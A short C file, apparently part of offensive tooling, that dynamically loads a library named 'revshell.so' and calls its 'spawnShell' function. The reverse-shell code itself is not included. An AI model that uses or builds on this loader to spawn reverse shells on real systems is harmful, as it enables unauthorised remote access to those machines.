/* reference code for the most part, may become generic module extension
   really no need to be here

   basically "felt cute, might delete later"
*/

#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    void *handle;
    const char* error_msg;
    void (*shell)(void);
    int result; 

    handle = dlopen("/full/path/to/revshell.so", RTLD_LAZY);
    if (!handle) {
        fprintf(stderr, "%s\n", dlerror());
        exit(EXIT_FAILURE);
    }
    dlerror();
    shell = dlsym(handle, "spawnShell");
    error_msg = dlerror();
    if (error_msg)  {
        fprintf(stderr, "Error accessing function %s \n", error_msg);
        exit(EXIT_FAILURE);
    }

    (*shell)();
    dlclose(handle);
}